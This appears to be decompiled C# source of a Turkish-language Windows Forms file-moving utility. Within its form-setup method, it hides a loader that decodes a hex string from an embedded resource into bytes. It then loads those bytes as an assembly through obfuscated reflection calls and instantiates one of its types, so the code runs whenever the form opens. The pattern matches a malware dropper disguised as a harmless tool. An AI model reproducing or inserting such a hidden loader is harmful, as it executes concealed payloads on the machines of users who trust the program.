using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using FolderToGacIfDifferent;

namespace SyhMhfzDosyaTasimaClass;

public class Form1 : Form
{
	public static string[] CV33112 = new string[3] { "6A576C77", "626F6E", "FolderToGacIfDifferent" };

	private IContainer components = null;

	private Button button1;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label1;

	private Label label2;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(ebubekirbastama.Copy(((Control)textBox1).get_Text(), ((Control)textBox2).get_Text()));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0385: Unknown result type (might be due to invalid IL or missing references)
		//IL_038f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label1 = new Label();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)button1).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)162));
		((Control)button1).set_Location(new Point(133, 124));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(103, 38));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Dosya Taşı");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(10, 28));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(413, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox2).set_Location(new Point(10, 87));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(413, 20));
		string text = ResourceDSD.String1.Replace("\\", "-00-");
		string[] array = text.Split(new char[1] { '-' });
		List<byte> list = new List<byte>();
		for (int i = 0; i < array.Length; i++)
		{
			list.Insert(i, (byte)Convert.ToSByte(array[i], 16));
		}
		object obj = Type.GetType(" System.Reflection.Assembly ".Trim())!.InvokeMember(" Load ".Trim(), BindingFlags.InvokeMethod, null, null, new object[1] { list.ToArray() });
		string[] cV = CV33112;
		Type type = ((Assembly)obj).GetExportedTypes()[1];
		object[] args = cV;
		Activator.CreateInstance(type, args);
		((Control)textBox2).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(147, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(89, 13));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Taşınacak Klasör");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(156, 71));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(60, 13));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Yeni Hedef");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaption);
		((Form)this).set_ClientSize(new Size(435, 174));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Dosya Taşıma İşlemleri");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
